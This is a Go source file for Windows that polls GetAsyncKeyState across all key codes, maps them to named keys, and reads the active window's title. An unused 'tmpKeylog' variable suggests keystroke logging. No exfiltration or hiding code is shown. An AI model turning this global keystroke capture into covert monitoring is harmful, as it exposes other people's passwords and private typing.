package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //GetWindowTextW

	tmpKeylog string
	tmpTitle  string
)

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func GetActiveWindowTitle() string {
	g, _ := getForegroundWindow()
	b := make([]uint16, 200)
	_, err := getWindowText(g, &b[0], int32(len(b)))
	if err != nil {
		ConsoleWriteError(fmt.Sprintf("error: %s", err))
		return fmt.Sprintf("error: %s", err)
	}
	return syscall.UTF16ToString(b)
}

type KeyCode string

const (
	CTRL              KeyCode = "CTRL"
	BACK              KeyCode = "BACK"
	TAB               KeyCode = "TAB"
	ENTER             KeyCode = "ENTER"
	SHIFT             KeyCode = "SHIFT"
	ALT               KeyCode = "ALT"
	CAPSLOCK          KeyCode = "CAPSLOCK"
	ESC               KeyCode = "ESC"
	SPACE             KeyCode = "SPACE"
	PAGEUP            KeyCode = "PAGEUP"
	PAGEDOWN          KeyCode = "PAGEDOWN"
	END               KeyCode = "END"
	LEFT              KeyCode = "LEFT"
	UP                KeyCode = "UP"
	RIGHT             KeyCode = "RIGHT"
	DOWN              KeyCode = "DOWN"
	SELECT            KeyCode = "SELECT"
	PRINT             KeyCode = "PRINT"
	EXECUTE           KeyCode = "EXECUTE"
	PRINTSCREEN       KeyCode = "PRINTSCREEN"
	INSERT            KeyCode = "INSERT"
	DELETE            KeyCode = "DELETE"
	HELP              KeyCode = "HELP"
	LEFTWINDOWS       KeyCode = "LEFTWINDOWS"
	RIGHTWINDOWS      KeyCode = "RIGHTWINDOWS"
	APPLICATIONSELECT KeyCode = "APPLICATIONSELECT"
	SLEEP             KeyCode = "SLEEP"
	PAD0              KeyCode = "PAD0"
	PAD1              KeyCode = "PAD1"
	PAD2              KeyCode = "PAD2"
	PAD3              KeyCode = "PAD3"
	PAD4              KeyCode = "PAD4"
	PAD5              KeyCode = "PAD5"
	PAD6              KeyCode = "PAD6"
	PAD7              KeyCode = "PAD7"
	PAD8              KeyCode = "PAD8"
	PAD9              KeyCode = "PAD9"
	MULTIPLY          KeyCode = "MULTIPLY"
	ADD               KeyCode = "ADD"
	SEPARATOR         KeyCode = "SEPARATOR"
	SUBTRACT          KeyCode = "SUBTRACT"
	DECIMAL           KeyCode = "DECIMAL"
	DIVIDE            KeyCode = "DIVIDE"
	F1                KeyCode = "F1"
	F2                KeyCode = "F2"
	F3                KeyCode = "F3"
	F4                KeyCode = "F4"
	F5                KeyCode = "F5"
	F6                KeyCode = "F6"
	F7                KeyCode = "F7"
	F8                KeyCode = "F8"
	F9                KeyCode = "F9"
	F10               KeyCode = "F10"
	F11               KeyCode = "F11"
	F12               KeyCode = "F12"
	NUMLOCK           KeyCode = "NUMLOCK"
	SCROLLLOCK        KeyCode = "SCROLLLOCK"
	LSHIFT            KeyCode = "LSHIFT"
	RSHIFT            KeyCode = "RSHIFT"
	LCTRL             KeyCode = "LCTRL"
	RCTRL             KeyCode = "RCTRL"
	LeftMENU          KeyCode = "LeftMENU"
	RightMENU         KeyCode = "RightMENU"
	SEMICOLON         KeyCode = "SEMICOLON"
	SLASH             KeyCode = "SLASH"
	BACKTICK          KeyCode = "BACKTICK"
	LEFTBRACKET       KeyCode = "LEFTBRACKET"
	BACKSLASH         KeyCode = "BACKSLASH"
	RIGHTBRACKET      KeyCode = "RIGHTBRACKET"
	SINGLEQUOTE       KeyCode = "SINGLEQUOTE"
	PERIOD            KeyCode = "PERIOD"
	ZERO              KeyCode = "0"
	ONE               KeyCode = "1"
	TWO               KeyCode = "2"
	THREE             KeyCode = "3"
	FOUR              KeyCode = "4"
	FIVE              KeyCode = "5"
	SIX               KeyCode = "6"
	SEVEN             KeyCode = "7"
	EIGHT             KeyCode = "8"
	NINE              KeyCode = "9"
	A                 KeyCode = "A"
	B                 KeyCode = "B"
	C                 KeyCode = "C"
	D                 KeyCode = "D"
	E                 KeyCode = "E"
	F                 KeyCode = "F"
	G                 KeyCode = "G"
	H                 KeyCode = "H"
	I                 KeyCode = "I"
	J                 KeyCode = "J"
	K                 KeyCode = "K"
	L                 KeyCode = "L"
	M                 KeyCode = "M"
	N                 KeyCode = "N"
	O                 KeyCode = "O"
	P                 KeyCode = "P"
	Q                 KeyCode = "Q"
	R                 KeyCode = "R"
	S                 KeyCode = "S"
	T                 KeyCode = "T"
	U                 KeyCode = "U"
	V                 KeyCode = "V"
	W                 KeyCode = "W"
	X                 KeyCode = "X"
	Y                 KeyCode = "Y"
	Z                 KeyCode = "Z"
	LBUTTON           KeyCode = "LBUTTON"
	RBUTTON           KeyCode = "RBUTTON"
	MBUTTON           KeyCode = "MBUTTON"
	ARROWUP           KeyCode = "ARROWUP"
	ARROWDOWN         KeyCode = "ARROWDOWN"
	ARROWLEFT         KeyCode = "ARROWLEFT"
	ARROWRIGHT        KeyCode = "ARROWRIGHT"
	COMMA             KeyCode = "COMMA"
	UNKNOWN           KeyCode = "UNKNOWN"
)

func toKeycode(key int) KeyCode {
	switch key {
	case w32.VK_RSHIFT:
		return RSHIFT
	case w32.VK_LCONTROL:
		return LCTRL
	case w32.VK_RCONTROL:
		return RCTRL
	case w32.VK_LMENU:
		return LeftMENU
	case w32.VK_RMENU:
		return RightMENU
	case w32.VK_OEM_1:
		return SEMICOLON
	case w32.VK_OEM_2:
		return SLASH
	case w32.VK_OEM_3:
		return BACKTICK
	case w32.VK_OEM_4:
		return LEFTBRACKET
	case w32.VK_OEM_5:
		return BACKSLASH
	case w32.VK_OEM_6:
		return RIGHTBRACKET
	case w32.VK_OEM_7:
		return SINGLEQUOTE
	case w32.VK_OEM_PERIOD:
		return PERIOD
	case 0x30:
		return ZERO
	case 0x31:
		return ONE
	case 0x32:
		return TWO
	case 0x33:
		return THREE
	case 0x34:
		return FOUR
	case 0x35:
		return FIVE
	case 0x36:
		return SIX
	case 0x37:
		return SEVEN
	case 0x38:
		return EIGHT
	case 0x39:
		return NINE
	case 0x41:
		return A
	case 0x42:
		return B
	case 0x43:
		return C
	case 0x44:
		return D
	case 0x45:
		return E
	case 0x46:
		return F
	case 0x47:
		return G
	case 0x48:
		return H
	case 0x49:
		return I
	case 0x4A:
		return J
	case 0x4B:
		return K
	case 0x4C:
		return L
	case 0x4D:
		return M
	case 0x4E:
		return N
	case 0x4F:
		return O
	case 0x50:
		return P
	case 0x51:
		return Q
	case 0x52:
		return R
	case 0x53:
		return S
	case 0x54:
		return T
	case 0x55:
		return U
	case 0x56:
		return V
	case 0x57:
		return W
	case 0x58:
		return X
	case 0x59:
		return Y
	case 0x5A:
		return Z
	case 0x01:
		return LBUTTON
	case 0x02:
		return RBUTTON
	case 0x04:
		return MBUTTON
	case 9:
		return TAB
	case 13:
		return ENTER
	case 16:
		return SHIFT
	case 17:
		return CTRL
	case 18:
		return ALT
	case 27:
		return ESC
	case 38:
		return ARROWUP
	case 37:
		return ARROWLEFT
	case 39:
		return ARROWRIGHT
	case 40:
		return ARROWDOWN
	case 160:
		return LSHIFT
	case 188:
		return COMMA
	}

	ConsoleWriteError(fmt.Sprintf("unknown key: %d", key))
	return UNKNOWN
}

func GetPressedKeys() []KeyCode {
	var keys []KeyCode
	for KEY := 0; KEY <= 256; KEY++ {
		Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
		if Val == 0 {
			continue
		}
		key := toKeycode(KEY)
		if key == UNKNOWN {
			continue
		}
		if key == LeftMENU {
			continue
		}
		if Val == 32769 {
			keys = append(keys, key)
		} else if Val == 32768 {
			keys = append(keys, key)
		} else if Val == 1 {
			keys = append(keys, key)
		} else if Val != 0 {
      ConsoleWriteError(fmt.Sprintf("unknown value: %d key: %d", Val, toKeycode(KEY))) 
		}
	}
	return keys
}
